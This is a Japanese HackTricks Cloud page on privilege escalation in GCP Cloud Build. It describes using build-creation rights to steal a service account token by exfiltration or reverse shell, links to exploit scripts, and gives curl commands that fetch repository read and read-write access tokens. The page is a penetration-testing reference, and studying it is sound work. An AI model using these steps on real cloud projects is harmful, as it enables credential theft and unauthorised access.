# GCP - Cloudbuild Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## cloudbuild

Cloud Buildについての詳細は以下をチェックしてください:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-cloud-build-enum.md" %}
[gcp-cloud-build-enum.md](../../gcp-pentesting/gcp-services/gcp-cloud-build-enum.md)
{% endcontent-ref %}

### `cloudbuild.builds.create`

この権限を持っていると、**クラウドビルドを提出**することができます。cloudbuildマシンには、デフォルトで**cloudbuildサービスアカウントのトークン**がファイルシステムに含まれています: `<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`。しかし、cloudbuildの設定で**プロジェクト内の任意のサービスアカウントを指定**することができます。\
したがって、マシンにトークンを自分のサーバーに流出させるか、**リバースシェルを取得して自分でトークンを取得**することができます（トークンが含まれるファイルは変更される可能性があります）。

オリジナルのエクスプロイトスクリプトは[**GitHub上でこちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py)にあります（しかし、私にはそのトークンの場所は機能しませんでした）。したがって、[**こちらで脆弱な環境の作成、エクスプロイト、クリーニングを自動化するスクリプト**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.sh)と、cloudbuildマシン内でリバースシェルを取得し[**こちらでトークンを盗むPythonスクリプト**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.py)をチェックしてください（コード内で他のサービスアカウントを指定する方法が見つかります）**。**

より詳細な説明については、[https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/)を訪れてください。

### `cloudbuild.builds.update`

**潜在的に**この権限を持っていると、前の権限で行われたように**クラウドビルドを更新してサービスアカウントトークンを盗む**ことができるかもしれません（しかし、残念ながらこの執筆時点でそのAPIを呼び出す方法は見つかりませんでした）。

TODO

### `cloudbuild.repositories.accessReadToken`

この権限を持っているユーザーは、リポジトリにアクセスするために使用される**読み取りアクセストークン**を取得できます：

{% code overflow="wrap" %}
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```
### `cloudbuild.repositories.accessReadWriteToken`

この権限を持つユーザーは、リポジトリにアクセスするために使用される**読み書きアクセストークン**を取得できます：

{% code overflow="wrap" %}
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```
{% endcode %}

### `cloudbuild.connections.fetchLinkableRepositories`

この権限を持っていると、**接続がアクセスできるリポジトリを取得できます:**

{% code overflow="wrap" %}
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
